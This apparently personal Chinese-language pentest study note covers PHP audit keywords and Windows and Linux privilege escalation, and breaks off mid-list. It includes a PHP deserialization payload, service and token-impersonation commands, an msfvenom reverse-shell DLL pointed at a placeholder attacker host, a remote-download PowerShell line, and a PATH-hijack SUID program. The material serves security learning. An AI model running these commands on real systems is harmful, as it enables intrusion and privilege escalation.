<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"># 显示当前目录下的内容： <span class="hljs-built_in">var_dump</span>(scandir(&#x27;.&#x27;));<br><br>想要获取当前目录下的内容（php 环境），就可以调用函数 <span class="hljs-built_in">scandir</span>()并让它输出 使用 <span class="hljs-built_in">var_dump</span>() 函数<br><br><span class="hljs-built_in">scandir</span>() 函数返回指定目录中的文件和目录的数组<br><br><span class="hljs-built_in">var_dump</span>()方法是判断一个变量的类型与长度,并输出变量的数值,如果变量 有值输的是变量的值并回返数据类型.此函数显示关于一个或多个表达式的结构 信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br><br># 写入文件 <span class="hljs-built_in">file_put_contents</span>() 如：写入一个名为 helloworld<span class="hljs-selector-class">.txt</span> 文件内容为 worldhello<br><span class="hljs-built_in">file_put_contents</span>(&#x27;helloworld.txt&#x27;,&#x27;worldhello&#x27;);<br></code></pre></td></tr></table></figure>





<h1 id="六、代码审计"><a href="#六、代码审计" class="headerlink" title="六、代码审计"></a>六、代码审计</h1><img src="/img/21.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs awk">漏洞关键字<br>SQL注入：<br> select insert update mysql_query mysqli等<br>文件上传：<br> <span class="hljs-variable">$FILES</span>,type=<span class="hljs-string">&quot;file&quot;</span>，上传，move_upload_file()等<br> 关键字搜索:(函数，键字，全局变量等)文件上传，<span class="hljs-variable">$_FILES</span>,move_uploaded_file等<br> 应用功能抓包:(任何可能存在上传的应用功能点)前台会员中心，后台新闻添加等可能存在上传的地方没有文件后缀 判断MIME类型知识点<br>搜索<span class="hljs-variable">$_FILES</span>-&gt;后台中心-&gt;上传图像-&gt;跟踪代码-&gt;逻辑判断业务功能分析-→&gt;会员中心-&gt;上传图像-&gt;跟踪代码-→&gt;逻辑判断搜索文件上传-&gt;会员中心-&gt;上传图像-&gt;跟踪代码-&gt;逻辑判断<br>XSS跨站：<br> print print_r echo sprintf die var_dump var_export等<br>文件包含：<br> Include include_once require require_once等<br>代码执行：<br> eval assert preg replace call user <span class="hljs-keyword">func</span> call user <span class="hljs-keyword">func</span> array等<br>命令执行：<br> system exec shell_exec `` passthru pcntl_exec popen proc_open<br>变量覆盖：<br> extract() parse_str() importrequestvariables() $$等<br>反序列化：<br> serialize() unserialize() _construct _destruct等<br> wakeup（） <span class="hljs-regexp">//</span>使用unserialize时触发<br> sleep（） <span class="hljs-regexp">//</span>使用serizalize时触发<br> destruct() <span class="hljs-regexp">//</span>对象被销毁时触发<br> call() <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br> callstatic() <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br> get() <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br> __isset() <span class="hljs-regexp">//</span>在不可访问的属性上调用iisset（）或者empyt() 触发<br> 找到__wakeup代码段，代码段调用函数中存在eval（）等函数操作，可调试payload<br> 构造getsource（）利用payload，实现file_get_contents函数配合eval执行<br> payload：action=test&amp;configuration=<span class="hljs-number">0</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;PMA_config&quot;</span>：<span class="hljs-number">1</span>：&#123;s:<span class="hljs-number">6</span>：<span class="hljs-string">&quot;source&quot;</span>,<span class="hljs-number">11</span>:<span class="hljs-string">&quot;d:/test.txt&quot;</span>；&#125;<br>通用关键字：<br> <span class="hljs-variable">$GET</span> <span class="hljs-variable">$POST</span> <span class="hljs-variable">$REQUEST</span> <span class="hljs-variable">$FILES</span> <span class="hljs-variable">$SEVER</span><br><br>双$$可能存在变量覆盖漏洞<br><br>在代码审计中：<br>MVC开发框架类: https:<span class="hljs-regexp">//</span> www.cnblogs.com<span class="hljs-regexp">/wsybky/</span>p/<span class="hljs-number">8638876</span>.html<br>Thinkphp框架:https:<span class="hljs-regexp">//</span>sites.thinkphp.cn/<span class="hljs-number">1556331</span><br><br>包命名规范<br>包名为：com.公司名.项目名.模块名...<br>持久层：dao、persist、mapper<br>实体类：enity、model、bean、javabean、pojo<br>业务逻辑：service、biz<br>控制器：controller、servlet、action、web<br>过滤器：filter<br>异常：exception<br>监听器：listener<br>不同框架下的一般包命名规则不同，这是大概规则，不同功能的 Java 文件放在不同包中，根据 Java 文件的功能同意安放以及命名。<br></code></pre></td></tr></table></figure>



<h3 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h3><ul>
<li>根据程序架构以及业务逻辑，通过数据流向的每一个换节来审计漏洞获取参数–&gt;表现层–&gt;业务层–&gt;持久层，需要通读源码缺点：耗费时间</li>
<li>通过查找和判断敏感函数上下文，追踪参数源头，审计是否存在漏洞缺点：覆盖不了逻辑漏洞，不了解程序基本框架</li>
</ul>
<blockquote>
<p>确定源码中是否存在框架-执行流程（表达式，拦截器过滤器是否自带或厂商重写）</p>
<p>确定源码中是否存在过滤器 – 自带或者引用自定义的拦截规则</p>
<p>过滤器中怎么触发，过滤器规则</p>
<p>其他还有中间件漏洞，比如 Tomcat 之类的，需要自己学习</p>
</blockquote>
<h3 id="审计工具"><a href="#审计工具" class="headerlink" title="审计工具"></a>审计工具</h3><ul>
<li><p>IDEA 插件 FindBugs（不能分析 JSP 文件）</p>
</li>
<li><p>Fortify_SCA 代码自动审计工具(主力，但是吃平台性能)</p>
<p>安装和使用参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41648820/article/details/116937035">https://blog.csdn.net/qq_41648820/article/details/116937035</a></p>
</li>
</ul>
<h3 id="ThinkPHP框架"><a href="#ThinkPHP框架" class="headerlink" title="ThinkPHP框架"></a>ThinkPHP框架</h3><ul>
<li>写法<ul>
<li>自写写法（未引用内置过滤）：常规的审计流程</li>
<li>不安全写法（未全部使用内部过滤）：跟踪调试</li>
<li>规则写法（使用内部过滤）：寻找对应版本 &#x2F; 探究对应版本的安全问题 &#x2F; 框架内置的过滤问题</li>
</ul>
</li>
<li>审计技术<ul>
<li>追踪对应：结合入口路由配合对应 &#x2F; 调试模式信息获取对应 &#x2F; 断点调试项目执行跟踪</li>
<li>调试开关：config.php &#x2F; app_debug&#x3D;’true’ &#x2F; app_trace&#x3D;’true’</li>
<li>输出调试：echo &#x2F; var_dump</li>
<li>版本：&#x2F;thinkphp&#x2F;base.php  —  &#x2F;thinkphp&#x2F;thinkphp.php</li>
</ul>
</li>
</ul>
<h3 id="Java框架类漏洞分析"><a href="#Java框架类漏洞分析" class="headerlink" title="Java框架类漏洞分析"></a>Java框架类漏洞分析</h3><p><strong>框架识别</strong></p>
<p>通过 xml 文件，对框架特征进行识别，参考 struts2 的配置文件名称为 struts.xml，里面那些处于头部的一般几个配置内容一般就是框架名称</p>
<p><strong>利用已知的框架漏洞</strong></p>
<p>就是在 xml 中，你找到了对应的框架名称和版本号后，直接在搜索引擎把框架名称和版本号以及“漏洞”这个关键字输进去就行</p>
<p><strong>挖掘未知漏洞</strong></p>
<ul>
<li>对框架类的过滤器或者拦截器进行分析<ul>
<li>检查 xml 配置文件，Struts2 的配置文件名称为 struts.xml</li>
<li>过滤器和拦截器，有的是框架自身自带的，有的是需要重写的，如果框架自身没有自带，或者该版本自带的是有漏洞的过滤器和拦截器，而应用厂商又没有进行过滤器和拦截器的重写，则可以对该漏洞进行利用。</li>
</ul>
</li>
<li>对框架特性进行分析</li>
<li>对框架的执行流程进行分析<ul>
<li>通过断点调试对框架的执行流程进行断点分析</li>
</ul>
</li>
</ul>
<h1 id="七、权限越权"><a href="#七、权限越权" class="headerlink" title="七、权限越权"></a>七、权限越权</h1><blockquote>
<p>可以获得的一些权限：</p>
<p>后台权限(获得方式:爆破、注入猜解,弱口令等):一般网站或应用后台智能操作应用的界面内容数据图片等信息,无法操作程序的源代码或服务器上的资源文件。(如后台功能存在文件操作的话也可以操作文件数据)</p>
<p>网站权限(获得方式:爆破、注入猜解,弱口令等):查看或修改(还要看有没有锁权)程序源代码,可以进行网站或应用的配置文件读取(接口配置信息、数据库配置信息等),还能收集服务器操作系统等相关的信息,为后续系统提权做准备。</p>
<p>数据库权限:操作数据库的权限,数据库的增删改查等,源码或配置文件泄露,也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p>
<p>接口权限:(邮件、短信、支付等)后台或网站权限后的获取途径:后台(修改配置信息功能点),网站权限(查看配置文件获取)</p>
<p>系统权限</p>
<p>域控权限等</p>
<p>提权方法有部分适用于在不同环境,当然也有通用方法</p>
<p>提权方法也有操作系统版本区分,特性决定方法的利用面</p>
<p>提权方法有部分需要特定环境,如数据库,第三方提权</p>
</blockquote>
<h3 id="网站权限后台漏洞第三方获取"><a href="#网站权限后台漏洞第三方获取" class="headerlink" title="网站权限后台漏洞第三方获取"></a>网站权限后台漏洞第三方获取</h3><ul>
<li>搜索网站架构框架，寻找是否存在已经发现的漏洞对网站进行测试</li>
<li>搜索寻找网站源码（如果有网站源码可以下载源码对其进行代码审计）</li>
<li>对网站进行抓包分析（寻找是否存在可以更改替换的攻击点）</li>
</ul>
<h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs scss">普通权限：<br>  默认情况下，系统为用户分了<span class="hljs-number">7</span>个组，并给每个组赋予不同的操作权限，<br>  管理员组(Administrators)、<br>  高权限用户组(PowerUsers)、<br>  普通用户组(Users)、<br>  备份操作组(BackupOperators)、<br>  文件复制组(Replicator)、<br>  来宾用户组(Guests)、<br>  身份验证用户(Ahthenticatedusers)<br>  其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。<br><br>  管理员组拥有大部分的计算机操作权限（并不是全部），能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。<br>  再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。<br>  普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。<br>  来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。<br>  身份验证用户组（Ahthenticated users）经过ms验证程序登录的用户均属于此组。<br>特殊权限：<br>  除了上面提到的<span class="hljs-number">7</span>个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是：<br>  SYSTEM（系统）、<br>  Trustedinstaller（信任程序模块）、<br>  Everyone（所有人）、<br>  CREATOR OWNER（创建者）等<br>  这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>  真正拥有“完全访问权”的只有一个成员：SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>  Everyone权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予Everyone权限的文件，包括来宾组成员。<br>  被标记为CREATOR OWNER权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>  但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>  无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。<br></code></pre></td></tr></table></figure>



<h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><p><strong>Windows命令：</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>systeminfo</td>
<td>打印系统信息</td>
</tr>
<tr>
<td>whoami</td>
<td>获取当前用户名</td>
</tr>
<tr>
<td>whoami &#x2F; priv</td>
<td>当前账户权限</td>
</tr>
<tr>
<td>ipconfig</td>
<td>网络配置信息</td>
</tr>
<tr>
<td>ipconfig &#x2F; displaydns</td>
<td>显示DNS缓存</td>
</tr>
<tr>
<td>route print</td>
<td>打印出路由表</td>
</tr>
<tr>
<td>arp -a</td>
<td>打印arp表</td>
</tr>
<tr>
<td>hostname</td>
<td>主机名</td>
</tr>
<tr>
<td>net user</td>
<td>列出用户</td>
</tr>
<tr>
<td>net user UserName</td>
<td>关于用户的信息</td>
</tr>
<tr>
<td>net use \ SMBPATH Pa$$w0rd &#x2F; u:UserName</td>
<td>链接SMB</td>
</tr>
<tr>
<td>net localgroup</td>
<td>列出所有组</td>
</tr>
<tr>
<td>net localgroup Group</td>
<td>关于指定组信息</td>
</tr>
<tr>
<td>net view \ 127.0.0.1</td>
<td>会话打开到当前计算机</td>
</tr>
<tr>
<td>net session</td>
<td>开放给其他机器</td>
</tr>
<tr>
<td>netsh firewall show config</td>
<td>显示防火墙配置</td>
</tr>
<tr>
<td>DRIVERQUERY</td>
<td>列出安装的驱动</td>
</tr>
<tr>
<td>Tasklist &#x2F;svc</td>
<td>列出服务任务</td>
</tr>
<tr>
<td>net start</td>
<td>列出启动的任务</td>
</tr>
<tr>
<td>dir &#x2F;s foo</td>
<td>在目录中搜索制定字符的项</td>
</tr>
<tr>
<td>dir &#x2F;s foo&#x3D;&#x3D;bar</td>
<td>在目录中搜索制定字符的项</td>
</tr>
<tr>
<td>sc query</td>
<td>列出所有服务</td>
</tr>
<tr>
<td>sc qc ServiceName</td>
<td>找到指定服务的路径</td>
</tr>
<tr>
<td>shutdown &#x2F;r &#x2F;t 0</td>
<td>立即重启</td>
</tr>
<tr>
<td>type file.txt</td>
<td>打印出内容</td>
</tr>
<tr>
<td>lcads “C\Example”</td>
<td>列出权限</td>
</tr>
<tr>
<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
<td>列出已安装的补丁</td>
</tr>
<tr>
<td>(New-Object System.Net.WebClient).DownloadFile(“<a target="_blank" rel="noopener" href="https://host/file&quot;,&quot;C:/LocalPath&quot;">https://host/file&quot;,&quot;C:/LocalPath&quot;</a>)</td>
<td>利用ps远程下载文件到本地</td>
</tr>
<tr>
<td>accesschk.exe -qwsu”Group”</td>
<td>修改对象</td>
</tr>
</tbody></table>
<ul>
<li>当收集系统信息之后，对系统信息进行分析，对系统所打的补丁进行筛选。但是没有打补丁的情况下不一定存在漏洞</li>
<li>Vulmap — 使用环境为poweshell,对web提权不友好</li>
<li>WES(Windows Exploit Suggester) — 主要用于web提权</li>
<li>WindowsVulnScan — 也是POSWESHELL脚本,也可以将目标systeminfo信息按照他的格式写入KB.json文件中,这样就可以用到WEB环境)对比</li>
<li>对漏洞进行利用，exp可以在github或者百度上搜索，同时可以使用msf等工具</li>
</ul>
<h4 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h4><p>使用漏洞CVE-2020-0787-Windows本地提权</p>
<h4 id="AT-amp-SC-amp-PS本地提权"><a href="#AT-amp-SC-amp-PS本地提权" class="headerlink" title="AT&amp;SC&amp;PS本地提权"></a>AT&amp;SC&amp;PS本地提权</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">at</span> xx:xx /interactive <span class="hljs-built_in">cmd</span>.exe<br>sc Create syscmd binPath=&quot;<span class="hljs-built_in">cmd</span> /k <span class="hljs-built_in">start</span>&quot; typr= own <span class="hljs-built_in">type</span> interact<br>sc <span class="hljs-built_in">start</span> syscmd<br>psexec.exe -accepteula -s -i -d notepad.exe (使用的前提为下载PSTools,针对Windows2008)<br></code></pre></td></tr></table></figure>



<h4 id="SQL-数据库提权"><a href="#SQL-数据库提权" class="headerlink" title="SQL 数据库提权"></a>SQL 数据库提权</h4><blockquote>
<p>获得数据库账号密码,可以在web和本地都尝试</p>
<p>在利用系统溢出漏洞无果的情况下,可以采用数据库进行提权,但需要知道数据库提权的前提条件:</p>
<p>服务器开启数据库服务及获得最高权限用户密码,除Access数据库外,其他数据库基本都存在数据库提权的可能</p>
<p>流程:服务探针-&gt;信息收集-&gt;提权利用-&gt;获取权限</p>
</blockquote>
<p><strong>数据库提权</strong></p>
<ul>
<li><p>探针</p>
<ul>
<li>端口</li>
<li>服务</li>
<li>其他</li>
<li>判断是否存在数据库服务</li>
</ul>
</li>
<li><p>收集数据(最高权限密码)</p>
<ul>
<li>配置文件</li>
<li>存储文件</li>
<li>暴力破解</li>
<li>其他方式</li>
</ul>
</li>
<li><p>分类</p>
<ul>
<li><p>MySQL</p>
<ul>
<li><p>UDF — (基于MYSQL调用命令执行函数)读取网站数据库配置文件(了解其命名规则及查找技巧)</p>
<p>sql data inc config conn database common include等，读取数据库存储或备份文件(了解其数据库存储格式及对应内容)</p>
<p>mysql数据库的密码存储在mysql数据库中，mysql数据库的密码存储在mysql数据库中，如果想要获取这个文件,我们可以下载该文件,在.MYD文件中寻找</p>
</li>
<li><p>MOF — (基于MYSQL特性的安全问题)导出自定义mof文件到系统目录加载</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p>
</li>
<li><p>启动项 — (基于配合操作系统自启动)导出自定义可执行文件到启动目录配合重启执行，将创建好的后⻔或执行文件进行服务器启动项写入,配合重启执行</p>
</li>
<li><p>反弹shell — (基于利用反弹特性命令执行)</p>
</li>
</ul>
</li>
<li><p>MSSQL</p>
<ul>
<li>xp_cmdshell — xp_cmdshell(数据库-系统数据库-mater-可编程性-系统扩展存储过程)默认在mssql2000中是开启的,在mssql2005之后的版本中则是默认禁止的,如果用户拥有管理员sa权限则可以用sp_congifgure重新开启它</li>
<li>sp_oacreate</li>
<li>sp_oamethod</li>
<li>沙盒模式</li>
<li>映像劫持</li>
</ul>
</li>
<li><p>Oracle — 自动化工具(Oracleshell)</p>
<ul>
<li>普通用户</li>
<li>DBA用户</li>
<li>注入模式</li>
</ul>
</li>
<li><p>Redis</p>
<ul>
<li>利用计划任务执行命令反弹shell</li>
<li>写ssh-keygen公钥使用私钥登录</li>
<li>低权限写webshell</li>
</ul>
</li>
<li><p>Postgresql</p>
<ul>
<li>CVE-2018-1058</li>
<li>CVE-2019-9193</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><strong>令牌窃取</strong></h4><p>一个进程的是由某个用户执行的,可以窃取该用户的令牌进行远程过程调用时请求提升权限,然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身,还用于原始请求进程时,漏洞就会出现。</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">获取会话-利用模块-窃取令牌-提权<br><span class="hljs-keyword">use</span> incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span><br></code></pre></td></tr></table></figure>



<h4 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a><strong>进程注入</strong></h4><p>进程注入提权是本地提权方式的一种较为老的安全技术了,利用的是注入进程的所有这实现权限共享机制,这类技术主要利用在Windows2008之前的操作系统上</p>
<h4 id="烂土豆"><a href="#烂土豆" class="headerlink" title="烂土豆"></a><strong>烂土豆</strong></h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">烂土豆提权的原理：<br>  欺骗<span class="hljs-string">&quot;NT AUTHORITY \ SYSTEM&quot;</span>账户通过NTLM认证到我们控制的TCP终端<br>  对这个认证过程使用中间人攻击(NTML重放)，为<span class="hljs-string">&quot;NT AUTHORITY \ SYSTEM&quot;</span>账户本地协商一个安全令牌。这个过程是通过一系列Windows API调用实现的。<br>  模仿这个令牌。只有具有<span class="hljs-string">&quot;模仿安全令牌权限&quot;</span>的账户才能去模仿别人的令牌，一般大多数的服务器账户(IIS,MSSQL等)有这个权限，大多数用户级的账户没有这个权限。<br>	所以一般从Web拿到的Webshell都是IIS服务器权限，具有模仿的权限。<br>烂土豆配合令牌窃取提权过程：上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功<br>	msf<span class="hljs-keyword"> :</span><span class="hljs-built_in"> execute </span>-cH -f ./potato.exe<br></code></pre></td></tr></table></figure>



<h4 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a><strong>dll劫持</strong></h4><p>Windows程序启动的时候需要DLL,如果这些DLL 不存在,则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常,Windows应用程序有其预先定义好的搜索DLL的路径,它会根据下面的顺序进行搜索:</p>
<ul>
<li>应用程序加载的目录</li>
<li>C:\Windows\system32</li>
<li>C:\Windows\system</li>
<li>C:\windows</li>
<li>当前工作目录Current Working Directory,CWD</li>
<li>在PATH环境变量的目录(先系统后用户)</li>
</ul>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">dll劫持过程：<br>信息收集(搜集服务器上其他的第三方应用)<br>进程调试(分析这个程序启动时调用那些dll)<br>制作dll并上传 - 替换dll - 启动应用后成功<br>msfvenom -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>lhost=xxx.xxx.xxx.xxx lport=xxxx -f ddl &gt;<span class="hljs-regexp">/opt/</span>test.dll<br></code></pre></td></tr></table></figure>



<h4 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a><strong>不带引号的服务路径</strong></h4><p>当Windows服务运行时，会发生两种情况：</p>
<ul>
<li>如果给出了可执行文件，同时引用了完整的路径，系统则会按照字面意思执行</li>
<li>如果服务的二进制路径并未包含在引号中，系统会将执行找到的空格分隔的服务路径的第一个实例</li>
</ul>
<p>攻击过程：</p>
<p>检测引号服务路径 - 利用路径制作文件并上传 - 启用服务或重启 - 调用后成功</p>
<h4 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a><strong>不安全的服务权限</strong></h4><p>即使正确的引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限。用户可以直接修改导致重定向执行文件</p>
<p>攻击过程：</p>
<p>检测服务权限配置 - 制作文件并上传 - 更改服务路径指向 - 调用后成功</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">accesschk.exe -uwcqv<span class="hljs-string">&quot;user&quot;</span> *<br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> <span class="hljs-string">&quot;Service&quot;</span> <span class="hljs-keyword">binpath=&quot;test.exe&quot;</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">sc </span>start <span class="hljs-string">&quot;Service&quot;</span><br></code></pre></td></tr></table></figure>



<h3 id="Linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h3><blockquote>
<p>提权环境,信息收集(SUID,定时任务,可能漏洞,第三方服务应用等)</p>
<p>最新相关漏洞要明确(关注点),二次开发相关脚本学会展望(四个脚本)</p>
<p>本地searchsploit脚本及远程exploitdb站点搜索说明</p>
<p>其他提权方法如:密码复用(mysql或其他第三方应用密码有可能是root密码),guid,sudo等说明</p>
</blockquote>
<h4 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>LinEnum: 通过webshell等权限将脚本上传到&#x2F;tmp目录(这个目录是一个临时目录,重启后会清空,一般是可以进行读写的),上传其他目录可能会因为权限不够而失败)</li>
<li>Linuxprivchecker：(是一个python文件,前期要收集服务器是否能够运行python文件)</li>
<li>漏洞探针（判断存在的漏洞）：linux-exploit-suggester ,linux-exploit-suggester2<ul>
<li>在Linux系统中运行不了信息收集的脚本的时候需要使用chmod +x LinEnum为其赋权</li>
</ul>
</li>
</ul>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p><strong>漏洞成因:</strong></p>
<p>chmod u+s给予了suid u-s删除了suid</p>
<p>执行过chmod u+s后,如果用户调用了这个程序会以root权限运行</p>
<p><strong>过程：</strong></p>
<ul>
<li>探针是否有SUID(手工或脚本)-特定SUID利用-利用</li>
<li>以下命令的作用是判断是否有SUID提权的可能性</li>
</ul>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -user root -prem <span class="hljs-number">-4000</span> -print <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -prem -u=s -type f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -prem <span class="hljs-number">-4000</span> -exec ls -ldb &#123; &#125; \;<br>https:<span class="hljs-comment">//pentestlab.blog/2017/09/25/suid-executables/</span><br></code></pre></td></tr></table></figure>



<p>利用冰蝎与msf工具联合通过SUID提权。</p>
<h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><p>提权过程:连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行</p>
<h4 id="本地环境变量"><a href="#本地环境变量" class="headerlink" title="本地环境变量"></a>本地环境变量</h4><p>配合SUID进行环境变量提权 — 本地用户环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">手写调用文件 — 编译 — 复制文件 — 增加环境变量 — 执行触发<br>test.c<br><span class="hljs-comment">#include&lt;unistd.h&gt;</span><br>void <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>	setuid(0);<br>	setgid(0);<br>	system(<span class="hljs-string">&quot;ps&quot;</span>);<br>&#125;<br><br>gcc test.c -o shell<br><br><span class="hljs-built_in">cp</span> /bin/sh /tmp/ps<br>将 /bin目录下的sh复制到/tmp下改名为ps  到/tmp目录下,如果输入ps则执行的是ps命令,而如果输入的是./ps则执行的是sh<br><br><span class="hljs-built_in">export</span> PATH=/tmp:PATH<br>当增加环境变量之后输入ps,则会直接执行/tmp目录下的ps(实际上是sh)<br><br>./shell<br></code></pre></td></tr></table></figure>

<p>需要条件：</p>
<ul>
<li>赋值了suid权限</li>
<li>需要本地用户(如果是webshll权限export PATH&#x3D;&#x2F;tmp:PATH执行不了)</li>
</ul>
<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><ul>
<li><p>路径问题：利用计划任务指向的文件的相对路径解析问题 (本地提权)</p>
<ul>
<li>计划任务的test没有写为绝对路径 <code>cat /etc/crontab</code></li>
